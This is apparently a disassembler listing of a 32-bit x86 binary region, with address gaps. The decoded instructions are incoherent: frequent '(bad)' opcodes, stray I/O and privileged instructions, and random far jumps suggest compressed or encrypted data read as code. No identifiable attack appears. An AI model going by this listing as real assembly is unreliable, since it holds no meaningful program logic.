  41fde7:	fcmove st,st(3)
  41fde9:	jge    0x41fd6d
  41fdeb:	pop    esp
  41fdec:	cmp    ecx,DWORD PTR [edi+0x457a566]
  41fdf2:	(bad)  
  41fdf3:	jl     0x41fe4b
  41fdf5:	lods   eax,DWORD PTR ds:[esi]
  41fdf6:	stos   BYTE PTR es:[edi],al
  41fdf7:	lds    esp,FWORD PTR [ecx]
  41fdf9:	xchg   ecx,eax
  41fdfa:	xchg   ebx,eax
  41fdfb:	lea    ecx,ds:[edi-0x64]
  41fdff:	fwait
  41fe00:	inc    ebp
  41fe01:	sub    cl,BYTE PTR [esp+ecx*2-0x38aaca8]
  41fe08:	imul   esp,esi,0x4c64d0fa
  41fe0e:	ds sub edx,esi
  41fe11:	cmp    eax,0x462e5f85
  41fe16:	test   eax,0x9b483e17
  41fe1b:	xchg   edx,eax
  41fe1c:	mov    dh,BYTE PTR [ebp+0x63]
  41fe1f:	loop   0x41fe9f
  41fe21:	into   
  41fe22:	clc    
  41fe23:	xchg   edi,eax
  41fe24:	rol    DWORD PTR [esi+0x5a67a81d],0xc7
  41fe2b:	dec    ebx
  41fe2c:	sar    BYTE PTR [eax*1-0x5b53d515],cl
  41fe33:	sti    
  41fe34:	xor    esi,DWORD PTR [ecx-0x43a63028]
  41fe3a:	mov    fs,WORD PTR [ebp-0x55204915]
  41fe40:	push   ss
  41fe41:	aad    0x44
  41fe43:	sbb    ah,0xa1
  41fe46:	lods   al,BYTE PTR ds:[esi]
  41fe47:	or     al,0xd3
  41fe49:	jg     0x41fe7c
  41fe4b:	mov    ecx,0x4709f028
  41fe50:	stc    
  41fe51:	je     0x41fe5c
  41fe53:	xchg   edi,eax
  41fe54:	and    al,0xfd
  41fe56:	hlt    
  41fe57:	pusha  
  41fe58:	arpl   WORD PTR [esi+ebp*1],ax
  41fe5b:	xor    al,al
  41fe5d:	add    DWORD PTR [ebx+0x2d3cfe],ecx
  41fe63:	xchg   ecx,eax
  41fe64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe65:	mov    ebp,0x2670a1be
  41fe6a:	dec    eax
  41fe6b:	js     0x41fe8d
  41fe6d:	(bad)  [ebp-0x3]
  41fe70:	xor    bh,BYTE PTR [edi]
  41fe72:	mov    bh,0x29
  41fe74:	loope  0x41fe5c
  41fe76:	pop    ebp
  41fe77:	sub    esi,edi
  41fe79:	mov    ebx,0xda683f2b
  41fe7e:	sbb    eax,DWORD PTR [edx+edi*2]
  41fe81:	jge    0x41fe38
  41fe83:	inc    esi
  41fe84:	scas   al,BYTE PTR es:[edi]
  41fe85:	or     eax,esp
  41fe87:	pusha  
  41fe88:	jbe    0x41fe67
  41fe8a:	aas    
  41fe8b:	jns    0x41fee9
  41fe8d:	bound  esi,QWORD PTR [esi+edi*2+0x41]
  41fe91:	xor    BYTE PTR [esi+esi*2+0x36],0x91
  41fe96:	add    DWORD PTR [eax],0xe6c51da2
  41fe9c:	cdq    
  41fe9d:	scas   eax,DWORD PTR es:[edi]
  41fe9e:	data16 das 
  41fea0:	push   ss
  41fea1:	sub    DWORD PTR [ebx-0x17937b80],ebp
  41fea7:	call   0x6480:0xfe23b366
  41feae:	jb     0x41fe59
  41feb0:	jo     0x41fee2
  41feb2:	dec    ebp
  41feb3:	call   0x5415:0xa3293101
  41feba:	sbb    eax,0x77c11b76
  41febf:	push   esp
  41fec0:	adc    ebp,ebp
	...
  41ff32:	add    BYTE PTR [eax],al
  41ff34:	mov    ecx,0xff25bf5d
  41ff39:	out    0xbb,eax
  41ff3b:	fisttp QWORD PTR [edi+0x7]
  41ff3e:	mov    WORD PTR [edi+0x1de4e6b1],?
  41ff44:	lock push esi
  41ff46:	add    DWORD PTR [eax],eax
  41ff48:	test   BYTE PTR [eax],0x0
  41ff4b:	add    BYTE PTR [ecx-0x49],cl
  41ff4e:	mov    BYTE PTR [eax+0x7d21065c],0x45
  41ff55:	add    edi,eax
  41ff57:	sub    esi,0x39bcaa04
  41ff5d:	fwait
  41ff5e:	js     0x41fefb
  41ff60:	fistp  DWORD PTR [eax+0x56]
  41ff63:	mov    bh,dh
  41ff65:	in     al,dx
  41ff66:	(bad)  
  41ff67:	mov    ds:0x7a520c88,al
  41ff6c:	popf   
  41ff6d:	mov    eax,ds:0x2f17bc8e
  41ff72:	xchg   edx,eax
  41ff73:	push   edx
  41ff74:	cmc    
  41ff75:	jp     0x41ff7b
  41ff77:	fwait
  41ff78:	test   ebp,edi
  41ff7a:	mov    dh,al
  41ff7c:	(bad)  
  41ff7d:	repnz xlat BYTE PTR ds:[ebx]
  41ff7f:	mov    dl,0x14
  41ff81:	(bad)
  41ff84:	dec    edx
  41ff85:	inc    edx
  41ff86:	push   es
  41ff87:	xor    BYTE PTR [ebp-0x4ac681ea],bh
  41ff8d:	ror    DWORD PTR [edx],1
  41ff8f:	mov    dh,BYTE PTR [ebp+0x787df9f3]
  41ff95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff96:	add    DWORD PTR [edi],ebp
  41ff98:	jg     0x41ff7a
  41ff9a:	ja     0x41ff2c
  41ff9c:	jge    0x41ffe6
  41ff9e:	(bad)  
  41ffa0:	in     al,dx
  41ffa1:	cld    
  41ffa2:	adc    al,0xa4
  41ffa4:	push   es
  41ffa5:	ror    DWORD PTR [edi+0x3b],0xe
  41ffa9:	pop    esi
  41ffaa:	mov    esp,eax
  41ffac:	or     DWORD PTR [esi],ebp
  41ffae:	mov    edi,ebx
  41ffb0:	sbb    eax,0x751151fe
  41ffb5:	xchg   edx,eax
  41ffb6:	aam    0x37
  41ffb8:	xchg   edi,eax
  41ffb9:	mov    dh,0x54
  41ffbb:	add    ebx,0xffffffea
  41ffbe:	sar    bl,0x38
  41ffc1:	(bad)  
  41ffc3:	xor    al,0x3d
  41ffc5:	or     BYTE PTR [eax],bl
  41ffc7:	sbb    edi,DWORD PTR [bx+si-0x60]
  41ffcb:	in     al,0xdf
  41ffcd:	ror    DWORD PTR ds:0x8aeb21a3,0x75
  41ffd4:	sub    bh,BYTE PTR [ebx+0x1b]
  41ffd7:	push   ecx
  41ffd8:	pop    ss
  41ffd9:	and    BYTE PTR [edi],bh
  41ffdb:	sbb    DWORD PTR [ecx+0x70],0x1
  41ffdf:	iret   
  41ffe0:	sbb    esp,ecx
  41ffe2:	aam    0x97
  41ffe4:	shr    DWORD PTR [ebp+ebx*4-0x5f],1
  41ffe8:	aad    0x38
  41ffea:	xlat   BYTE PTR ds:[ebx]
  41ffeb:	xor    al,0x9c
  41ffed:	inc    edx
  41ffee:	mov    edx,0xc9fb4d09
  41fff3:	dec    edx
  41fff4:	out    0x41,eax
  41fff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fff7:	jno    0x41ffd5
  41fff9:	icebp  
  41fffa:	cmp    al,0xd9
  41fffc:	je     0x420045
  41fffe:	dec    edi
  41ffff:	push   0x59
  420001:	cdq    
  420002:	repnz sbb DWORD PTR [ecx+0xf],ecx
  420006:	stc    
  420007:	pop    ebx
  420008:	pop    ss
  420009:	pop    ecx
  42000a:	cmp    esi,DWORD PTR [edi+0x4b65532b]
  420010:	pop    ecx
  420011:	cmp    esi,ebx
  420013:	(bad)  
  420014:	std    
  420015:	jae    0x420066
  420017:	push   esp
  420018:	jae    0x42001a
  42001a:	jecxz  0x41ffd2
  42001c:	int    0xfb
  42001e:	outs   dx,DWORD PTR ds:[esi]
  42001f:	rcr    DWORD PTR [edx],1
  420021:	or     ebp,eax
  420023:	pop    ecx
  420024:	nop
  420025:	xchg   edi,eax
  420026:	mov    ds:0xca31b34b,eax
  42002b:	(bad)
  42002f:	dec    ebx
  420030:	data16 fcom QWORD PTR [ecx+0x5f]
  420034:	stos   BYTE PTR es:[edi],al
  420035:	imul   esp,DWORD PTR [ecx],0xe2b03849
  42003b:	mov    dh,0xf1
  42003d:	and    dh,al
  42003f:	in     eax,dx
  420040:	xor    eax,0x7a
	...
  4200b1:	add    BYTE PTR [eax],al
  4200b3:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  4200b9:	mov    ebx,0xe891ffdf
  4200be:	arpl   WORD PTR [eax+0x2016782a],ax
  4200c4:	out    0x57,al
  4200c6:	add    DWORD PTR [eax],eax
  4200c8:	test   BYTE PTR [eax],0x0
  4200cb:	add    cl,dh
  4200cd:	cld    
  4200ce:	mov    ch,0xe5
  4200d0:	or     al,0x8c
  4200d2:	cmp    eax,0x14c4ec5
  4200d7:	push   es
  4200d8:	call   0x15f0:0x3903acda
  4200df:	clc    
  4200e0:	adc    esp,DWORD PTR [ecx+0x21]
  4200e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4200e4:	pop    esi
  4200e5:	mov    ch,0xf1
  4200e7:	add    eax,0x2d6808f2
  4200ec:	daa    
  4200ed:	cmp    dl,BYTE PTR [eax-0xf7b2695]
  4200f3:	pop    ebx
  4200f4:	int    0x9b
  4200f6:	das    
  4200f7:	xchg   BYTE PTR [ebp+0x62],dh
  4200fa:	fmul   QWORD PTR [edi-0x58]
  4200fd:	call   0x42d49f1f
  420102:	cs dec edx
  420104:	push   ss
  420105:	outs   dx,DWORD PTR ds:[esi]
  420106:	nop
  420107:	push   0x3bbe6c0
  42010c:	jne    0x4200c3
  42010e:	fwait
  42010f:	jle    0x420155
  420111:	jmp    0x3022ae7c
  420116:	loope  0x420190
  420118:	jno    0x4200ad
  42011a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42011b:	cmp    ah,BYTE PTR [eax+0x5031169d]
  420121:	sub    DWORD PTR [edx-0x108c6ce8],ebp
  420127:	outs   dx,BYTE PTR ds:[esi]
  420128:	scas   al,BYTE PTR es:[edi]
  420129:	cdq    
  42012a:	popf   
  42012b:	jl     0x420195
  42012d:	mov    al,0x8e
  42012f:	mov    dh,0xda
  420131:	sub    DWORD PTR [eax+ebp*4-0x782804b],ebx
  420138:	(bad)  
  42013a:	jo     0x42010d
  42013c:	push   edx
  42013d:	sbb    dl,BYTE PTR [edi-0x1e]
  420140:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420141:	adc    ecx,DWORD PTR [esi+0x38]
  420144:	jecxz  0x420103
  420146:	pop    DWORD PTR [ebp-0x11462958]
  42014c:	or     eax,0xc3e2acc4
  420151:	fiadd  WORD PTR [esi]
  420153:	int3   
  420154:	inc    edx
  420155:	dec    ebp
  420156:	xchg   ecx,eax
  420157:	dec    esp
  420158:	and    eax,DWORD PTR [ecx]
  42015a:	ds jnp 0x420144
  42015d:	mov    dl,0x8
  42015f:	mov    eax,0xbcb78c0a
  420164:	add    al,0x5c
  420166:	dec    eax
  420167:	xchg   ebx,eax
  420168:	call   0x768d:0x8ce1b821
  42016f:	(bad)  
  420170:	repnz test eax,0x2119f2bd
  420176:	cmp    edx,ebp
  420178:	div    edi
  42017a:	adc    ch,BYTE PTR [eax-0x78]
  42017d:	and    dl,ah
  42017f:	sub    bh,bh
  420181:	mov    ch,BYTE PTR [ecx]
  420183:	lods   eax,DWORD PTR ds:[esi]
  420184:	aad    0x7a
  420186:	loop   0x420121
  420188:	pop    DWORD PTR [esi-0x79]
  42018b:	xor    DWORD PTR [ebp+0x4e],0x41
  42018f:	cmc    
  420190:	nop
  420191:	push   esp
  420192:	xchg   ecx,eax
  420193:	test   al,0x92
  420195:	xchg   esp,eax
  420196:	mov    eax,ds:0x9f5dc48e
  42019b:	add    ebp,DWORD PTR [ebx+0x7de0760e]
  4201a1:	call   0xacef8ed6
  4201a6:	int3   
  4201a7:	lahf   
  4201a8:	mov    cl,0x28
  4201aa:	mov    eax,ds:0x6a7582f0
  4201af:	dec    esi
  4201b0:	scas   al,BYTE PTR es:[edi]
  4201b1:	arpl   WORD PTR [edi+0x42fe8f3b],cx
  4201b7:	sub    al,0x21
  4201b9:	or     esp,DWORD PTR [ebx-0x48]
  4201bc:	aas    
  4201bd:	adc    eax,DWORD PTR [ecx+eax*2+0x476c]
	...
  420234:	push   ecx
  420235:	sbb    edi,edi
  420237:	jmp    si
  42023a:	fnstcw WORD PTR [edi]
  42023c:	mov    DWORD PTR ds:0xd00ed010,ebx
  420242:	jbe    0x42024c
  420244:	fcomp  QWORD PTR [eax+0x1]
  420247:	add    dh,dh
  420249:	add    BYTE PTR [eax],al
  42024b:	add    BYTE PTR [ebx+0x5cc34fb2],bh
  420251:	xchg   ebp,eax
  420252:	les    esp,FWORD PTR [eax+0x6f]
  420255:	in     al,dx
  420256:	cmp    eax,0x831ceeb3
  42025b:	sub    al,0x46
  42025d:	sbb    DWORD PTR [esi],ecx
  42025f:	jl     0x420275
  420261:	out    0xb7,eax
  420263:	and    ah,BYTE PTR [edx+ebp*8+0x79742ee2]
  42026a:	mov    ecx,0xe749769e
  42026f:	inc    ecx
  420270:	or     DWORD PTR [eax-0x19],esi
  420273:	add    BYTE PTR [ebp+ebx*1+0x5ab93166],ch
  42027a:	les    esi,FWORD PTR [edx]
  42027c:	push   ebx
  42027d:	mov    eax,ds:0x551cfaa6
  420282:	(bad)  
  420284:	jno    0x420221
  420286:	test   ebx,edi
  420288:	mov    esi,0x4de8fbb9
  42028d:	push   0x8a4a30c1
  420292:	aam    0x1b
  420294:	mov    esi,0x3332dbf3
  420299:	clc    
  42029a:	fild   DWORD PTR ds:0x12d4a36b
  4202a0:	push   ebx
  4202a1:	push   ecx
  4202a2:	add    bl,BYTE PTR [edi+0x54]
  4202a5:	xor    DWORD PTR [edi+0x2e],esi
  4202a8:	push   edx
  4202a9:	std    
  4202aa:	stc    
  4202ab:	or     al,0x6a
  4202ad:	les    ebx,FWORD PTR [ebp+0x6ed9a721]
  4202b3:	cld    
  4202b4:	jge    0x420288
  4202b6:	sbb    al,0xbe
  4202b8:	(bad)  
  4202b9:	push   eax
  4202ba:	in     al,dx
  4202bb:	call   0x779e:0x9a7e644f
  4202c2:	iret   
  4202c3:	bound  edi,QWORD PTR [edi-0x290c0635]
  4202c9:	imul   ecx,DWORD PTR [edx],0x34c6931f
  4202cf:	in     eax,dx
  4202d0:	(bad)  [esi+0x4cb2522]
  4202d6:	push   ss
  4202d7:	enter  0x4d3f,0xaf
  4202db:	repnz imul ebx,DWORD PTR [esi+0x5c],0xe1cfbba7
  4202e3:	jmp    0x4202f3
  4202e5:	sbb    eax,0xd58de73
  4202ea:	jmp    0x4202a2
  4202ec:	inc    ecx
  4202ed:	xchg   ecx,eax
  4202ee:	push   ebp
  4202ef:	sub    al,0x1e
  4202f1:	test   eax,0x98a44792
  4202f6:	daa    
  4202f7:	xchg   esi,eax
  4202f8:	(bad)  
  4202f9:	xchg   ebx,eax
  4202fa:	fadd   QWORD PTR [eax-0x262af0f7]
  420300:	call   0x48aa:0xe3e1043a
  420307:	cdq    
  420308:	jp     0x4202ee
  42030a:	xchg   edx,eax
  42030c:	inc    edx
  42030d:	push   es
  42030e:	es inc ecx
  420310:	sub    BYTE PTR [esi+0x4c],al
  420313:	pop    ss
  420314:	jecxz  0x420337
  420316:	pop    ss
  420317:	xchg   ebp,eax
  420318:	ds aas 
  42031a:	xlat   BYTE PTR ds:[ebx]
  42031b:	push   edx
  42031c:	(bad)  
  42031d:	mov    WORD PTR ds:0x37fc5032,es
  420323:	and    DWORD PTR [edx],ecx
  420325:	das    
  420326:	popf   
  420327:	hlt    
  420328:	jae    0x420366
  42032a:	xchg   esp,eax
  42032b:	mov    esp,0x820afbb3
  420330:	inc    ebx
  420331:	sub    BYTE PTR ds:0x1c5fa525,dh
  420337:	outs   dx,DWORD PTR ds:[esi]
  420338:	push   edi
  420339:	cmp    al,0xb9
  42033b:	lods   eax,DWORD PTR ds:[esi]
  42033c:	outs   dx,BYTE PTR ds:[esi]
  42033d:	mov    WORD PTR [ebx+0x68],ds
  420340:	and    ebx,DWORD PTR [ecx+0x0]
	...
  4203b3:	add    BYTE PTR [edi+eiz*8],bh
  4203b6:	imul   ebp,edi,0xfffffffb
  4203b9:	out    dx,eax
  4203ba:	mov    esp,0x889a5af7
  4203bf:	arpl   cx,bx
  4203c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203c3:	js     0x420397
  4203c5:	pop    ecx
  4203c6:	add    DWORD PTR [eax],eax
  4203c8:	test   BYTE PTR [eax],0x0
  4203cb:	add    dl,al
  4203cd:	mov    ebx,ebp
  4203cf:	aam    0x4e
  4203d1:	xor    BYTE PTR [ecx-0x6a],bh
  4203d4:	mov    bl,0x89
  4203d6:	or     DWORD PTR [ebx-0x5c21c80a],ecx
  4203dc:	js     0x42040c
  4203de:	mov    bl,0x48
  4203e0:	xor    dh,ch
  4203e2:	gs jo  0x4203fd
  4203e5:	inc    ebx
  4203e6:	push   edi
  4203e7:	daa    
  4203e8:	(bad)  
  4203e9:	out    dx,al
  4203ea:	xor    BYTE PTR [eax-0x76],dl
  4203ed:	ficomp DWORD PTR [esi+edx*4+0x8799de9]
  4203f4:	cmp    al,0xa5
  4203f6:	int    0x83
  4203f8:	mov    bh,0x6c
  4203fa:	sub    al,0xc9
  4203fc:	cmp    BYTE PTR [edx-0x4b9aafc1],ah
  420402:	in     al,0xfe
  420404:	call   0x39a6:0xb2ccfb37
  42040b:	inc    edi
  42040c:	dec    esp
  42040d:	and    esi,DWORD PTR [edi-0x3978ff29]
  420413:	jle    0x420479
  420415:	or     BYTE PTR [edi],ah
  420417:	mov    al,ds:0x1417240b
  42041c:	cmp    esi,DWORD PTR [esp+edi*4-0x17]
  420420:	shr    DWORD PTR [edx],1
  420422:	xchg   esp,eax
  420423:	cli    
  420424:	scas   eax,DWORD PTR es:[edi]
  420425:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420426:	inc    edi
  420427:	adc    BYTE PTR [edx-0x43],dl
  42042a:	out    0xce,al
  42042c:	mov    dl,0xdd
  42042e:	xor    edi,DWORD PTR [ecx-0x14]
  420431:	or     eax,0xe02ff9f4
  420436:	or     edi,ebx
  420438:	xor    DWORD PTR [ecx-0x1b],ecx
  42043b:	jo     0x42045b
  42043d:	fwait
  42043e:	and    DWORD PTR [eax-0x18],eax
  420441:	in     al,0x29
  420443:	inc    eax
  420444:	xor    bl,BYTE PTR ds:0x440d39d6
  42044a:	out    0x5a,al
  42044c:	test   al,0x7b
  42044e:	ret    
  42044f:	sub    al,0xd
  420451:	mul    DWORD PTR [ebx-0x72e3a979]
  420457:	scas   eax,DWORD PTR es:[edi]
  420458:	fcomp  QWORD PTR [edx+0x5cbcffbf]
  42045e:	fidivr DWORD PTR [edi+0x7bf31ae6]
  420464:	movups xmm1,XMMWORD PTR [eax+edx*1+0x10]
  420469:	add    cl,BYTE PTR [edx-0x48eeb126]
  42046f:	sbb    ah,al
  420471:	nop
  420472:	addr16 pusha 
  420474:	xchg   edi,eax
  420475:	hlt    
  420476:	leave  
  420477:	mov    ecx,0x1723b47b
  42047c:	push   0x36ff8e09
  420481:	sbb    ebx,DWORD PTR [ecx-0x5e]
  420484:	push   ss
  420485:	jmp    0x924c:0xdbb4605f
  42048c:	jne    0x42050d
  42048e:	dec    eax
  42048f:	add    eax,0x87ef0f14
  420494:	cwde   
  420495:	push   es
  420496:	(bad)  
  420498:	and    BYTE PTR [edx],0x93
  42049b:	push   0x99151f3c
  4204a0:	and    ebx,DWORD PTR es:[ecx]
  4204a3:	adc    DWORD PTR [edi-0x71],0x35b3aa67
  4204aa:	pop    ss
  4204ab:	or     ah,BYTE PTR [eax+edx*1+0x18827b29]
  4204b2:	dec    ecx
  4204b3:	sub    eax,0xf635764d
  4204b8:	ss push esp
  4204ba:	cli    
  4204bb:	xor    al,0x41
  4204bd:	fcmovu st,st(6)
  4204bf:	je     0x42044b
  4204c1:	add    BYTE PTR ds:[eax],al
	...
  420534:	js     0x42056a
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	imul   esp,DWORD PTR [ebx+0x41],0x15ac89d
  420547:	add    dh,dh
  420549:	add    BYTE PTR [eax],al
  42054b:	add    cl,dh
  42054d:	jle    0x42055a
  42054f:	rcl    DWORD PTR [ecx-0x16],cl
  420552:	jg     0x4205bd
  420554:	xor    DWORD PTR [edx],edx
  420556:	cdq    
  420557:	mov    WORD PTR [edi+0x52],ss
  42055a:	xchg   edi,eax
  42055b:	add    edx,DWORD PTR [ebp+0x16]
  42055e:	or     ch,dh
  420560:	add    eax,0xb08af190
  420565:	fld    QWORD PTR [edi+ecx*1+0x2b]
  420569:	mov    ecx,?
  42056b:	xchg   edi,eax
  42056c:	push   0x34
  42056e:	outs   dx,DWORD PTR gs:[esi]
  420570:	mov    al,0x6a
  420572:	(bad)  
  420573:	mov    esp,0x8dca04c
  420578:	data16 xor al,0x11
  42057b:	adc    al,0x2
  42057d:	int    0xa4
  42057f:	adc    edi,esp
  420581:	aas    
  420582:	fsubr  DWORD PTR [eax]
  420584:	stc    
  420585:	inc    ecx
  420586:	div    cl
  420588:	(bad)  
  420589:	repz jecxz 0x42052c
  42058c:	cmp    eax,0x61cb039d
  420591:	fdivr  DWORD PTR [edi]
  420593:	mov    WORD PTR [ebp-0x5b],ds
  420596:	(bad)  
  420597:	cdq    
  420598:	stos   DWORD PTR es:[edi],eax
  420599:	jl     0x420575
  42059b:	into   
  42059c:	cmp    al,BYTE PTR es:[ecx+0x6a]
  4205a0:	cmp    al,0x41
  4205a2:	ins    DWORD PTR es:[edi],dx
  4205a3:	daa    
  4205a4:	call   0xb07f4a47
  4205a9:	sti    
  4205aa:	cmp    BYTE PTR [edi+eax*4+0x51],bl
  4205ae:	xchg   ebp,eax
  4205af:	scas   eax,DWORD PTR es:[edi]
  4205b0:	adc    al,0xb5
  4205b2:	mov    al,0x92
  4205b4:	pop    eax
  4205b5:	xchg   DWORD PTR [edx-0x1c],ecx
  4205b8:	test   eax,0xc0c36a83
  4205bd:	call   0x5461:0xf6e02ab7
  4205c4:	jl     0x420616
  4205c6:	xor    al,0x56
  4205c8:	mov    al,ds:0xc8de4c7f
  4205cd:	std    
  4205ce:	daa    
  4205cf:	fwait
  4205d0:	sahf   
  4205d1:	push   esp
  4205d2:	mov    esp,0x9296c191
  4205d7:	outs   dx,DWORD PTR ds:[esi]
  4205d8:	mov    eax,0xdb3e4c2d
  4205dd:	sti    
  4205de:	add    bl,BYTE PTR [eax-0x47]
  4205e1:	out    0xb5,eax
  4205e3:	jno    0x420585
  4205e5:	xchg   ebx,eax
  4205e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205e7:	xchg   edi,eax
  4205e8:	inc    ebp
  4205e9:	sbb    eax,ebx
  4205eb:	xchg   BYTE PTR [ecx+ebx*8+0x1b],ah
  4205ef:	aad    0xc7
  4205f1:	pop    ecx
  4205f2:	in     eax,dx
  4205f3:	enterw 0x7137,0x18
  4205f8:	push   cs
  4205f9:	es popf 
  4205fb:	or     dl,dl
  4205fd:	call   0x613a:0x1377b489
  420604:	xchg   edi,eax
  420605:	push   ebp
  420606:	jecxz  0x420673
  420608:	in     eax,0xb3
  42060a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42060b:	lods   al,BYTE PTR ds:[esi]
  42060c:	adc    dl,ch
  42060e:	mov    BYTE PTR ds:0x87313141,ah
  420614:	xor    BYTE PTR [ebx+eax*2-0x2fceab37],bh
  42061b:	clc    
  42061c:	xchg   ecx,eax
  42061d:	jo     0x420625
  42061f:	jle    0x4205b9
  420621:	mov    al,0x4a
  420623:	dec    esp
  420624:	shl    DWORD PTR [esi],cl
  420626:	cmp    BYTE PTR [edi],bl
  420628:	les    edx,FWORD PTR [ecx]
  42062a:	jmp    0xc3e6:0x85d1050f
  420631:	bound  esp,QWORD PTR [ebp+eax*4+0x57]
  420635:	or     BYTE PTR [ebx+0x5a49947d],al
  42063b:	and    BYTE PTR [ecx-0x7b],cl
  42063e:	jbe    0x420646
  420640:	mov    WORD PTR [esi+0x0],ds
	...
  4206b3:	add    BYTE PTR [edx-0x5081dcc4],dl
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	inc    esi
  4206c1:	jae    0x420729
  4206c3:	into   
  4206c4:	mov    esi,0xf600015b
  4206c9:	add    BYTE PTR [eax],al
  4206cb:	add    BYTE PTR [ebx-0x3e],cl
  4206ce:	fcom   DWORD PTR [ecx-0x6a]
  4206d1:	out    0x30,al
  4206d3:	dec    edx
  4206d4:	push   esp
  4206d5:	cmc    
  4206d6:	mov    al,ds:0x42c39b66
  4206db:	js     0x420682
  4206dd:	add    al,cl
  4206df:	hlt    
  4206e0:	xor    ah,BYTE PTR [ebp-0x18]
  4206e3:	out    dx,eax
  4206e4:	fistp  DWORD PTR [edx+0xfac8805]
  4206ea:	xor    eax,ebp
  4206ec:	sbb    BYTE PTR [ecx],0x28
  4206ef:	dec    ecx
  4206f0:	arpl   WORD PTR [edi-0x24aff9bd],si
  4206f6:	sbb    bl,ch
  4206f8:	ss fs scas eax,DWORD PTR es:[edi]
  4206fb:	mov    ds,WORD PTR [esp+edx*8-0x2a1bbeef]
  420702:	fistp  WORD PTR [edi]
  420704:	pop    es
  420705:	xchg   ebp,eax
  420706:	mov    bl,0xc3
  420708:	cmp    al,0x5e
  42070a:	ja     0x420703
  42070c:	dec    ebp
  42070d:	sbb    eax,0x5778da01
  420712:	xor    cl,BYTE PTR [edi+0x26]
  420715:	cld    
  420716:	add    ebp,DWORD PTR ds:[eax+0x5e58acbe]
  42071d:	lock mov cl,0x9a
  420720:	fist   DWORD PTR [edi+0x41]
  420723:	dec    ecx
  420724:	dec    eax
  420725:	or     ecx,esp
  420727:	out    0x5,al
  420729:	loope  0x42071f
  42072b:	push   ss
  42072c:	jns    0x4206c8
  42072e:	(bad)  [ebp+0x559b41c8]
  420734:	ficomp WORD PTR ds:0x7f273841
  42073a:	(bad)  
  42073b:	jnp    0x420713
  42073d:	jp     0x42076d
  42073f:	sub    BYTE PTR [eax],0xb9
  420742:	ds xor eax,0x4ba577ba
  420748:	dec    esp
  420749:	icebp  
  42074a:	pushf  
  42074b:	aaa    
  42074c:	and    al,BYTE PTR [eax+0x53fcdb36]
  420752:	mov    ds,WORD PTR [edi]
  420754:	in     al,dx
  420755:	aam    0x2c
  420757:	and    dl,BYTE PTR [ecx]
  420759:	or     edi,esi
  42075b:	push   ebx
  42075c:	(bad)
  42075f:	or     esp,DWORD PTR [eax+0x5b2bb7ae]
  420765:	jmp    0x32c:0xe766ef33
  42076c:	push   eax
  42076d:	cmp    al,0x32
  42076f:	sahf   
  420770:	(bad)  
  420771:	pop    di
  420773:	retf   0x4b1
  420776:	inc    ebx
  420777:	jge    0x4206fa
  420779:	jg     0x420728
  42077b:	pop    ecx
  42077c:	push   ebp
  42077d:	dec    edx
  42077e:	inc    edi
  42077f:	dec    ecx
  420780:	push   ebp
  420781:	xchg   DWORD PTR [edi],esi
  420783:	shl    dh,cl
  420785:	ficomp DWORD PTR [esi+0x20]
  420788:	mov    dh,0x23
  42078a:	das    
  42078b:	(bad)  
  42078c:	loop   0x42075e
  42078e:	mov    ebp,0xfd829f1c
  420793:	aas    
  420794:	fnsave [ebp+0x18]
  420797:	gs sub al,dl
  42079a:	ret    0x6599
  42079d:	inc    eax
  42079e:	test   cl,al
  4207a0:	mov    edx,0x8f43738a
  4207a5:	(bad)  [edi]
  4207a7:	dec    edx
  4207a8:	(bad)  
  4207a9:	idiv   BYTE PTR [ecx+0x34723a21]
  4207af:	sar    DWORD PTR ds:0xdc6f948e,cl
  4207b5:	scas   eax,DWORD PTR es:[edi]
  4207b6:	or     cl,BYTE PTR ds:[edi-0x75bdc627]
  4207bd:	sub    al,0xf2
  4207bf:	add    BYTE PTR [edx+0x99],0x0
	...
  420832:	add    BYTE PTR [eax],al
  420834:	mov    eax,ds:0x3b920b9a
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0x76
  420841:	cmp    cl,BYTE PTR [ebx+0x15cb41c]
  420847:	add    dh,dh
  420849:	add    BYTE PTR [eax],al
  42084b:	add    BYTE PTR [eax],ah
  42084d:	lods   eax,DWORD PTR ds:[esi]
  42084e:	pop    ss
  42084f:	rcr    DWORD PTR [eax+0x5],cl
  420852:	lahf   
  420853:	out    0x88,al
  420855:	jns    0x420868
  420857:	adc    al,0x78
  420859:	mov    ecx,0xdaf94bdf
  42085e:	out    0x20,al
  420860:	push   eax
  420861:	lds    esp,FWORD PTR [esi+0x64]
  420864:	and    DWORD PTR [ebx],0x46372355
  42086a:	jmp    0x420814
  42086c:	adc    ebx,ebx
  42086e:	aaa    
  42086f:	xor    al,dh
  420871:	clc    
  420872:	lea    esp,[eax]
  420874:	adc    eax,0x8ad8d5cc
  420879:	xor    esp,0x66e6ab31
  42087f:	out    dx,al
  420880:	stos   BYTE PTR es:[edi],al
  420881:	inc    eax
  420882:	test   BYTE PTR ds:0xaa110fb7,0x65
  420889:	sbb    DWORD PTR [edx-0x512c23ac],edx
  42088f:	in     eax,dx
  420890:	add    bl,cl
  420892:	adc    ch,BYTE PTR [esi]
  420894:	or     BYTE PTR [esi-0x42246ef0],0x7a
  42089b:	xlat   BYTE PTR ds:[ebx]
  42089c:	clc    
  42089d:	pop    ebx
  42089e:	jl     0x4208c7
  4208a0:	sbb    DWORD PTR [edi+0x2371af77],eax
  4208a6:	aas    
  4208a7:	jmp    0xdb6a:0x32a1233
  4208ae:	mov    ch,0x14
  4208b0:	inc    ebx
  4208b1:	adc    esp,DWORD PTR [edx]
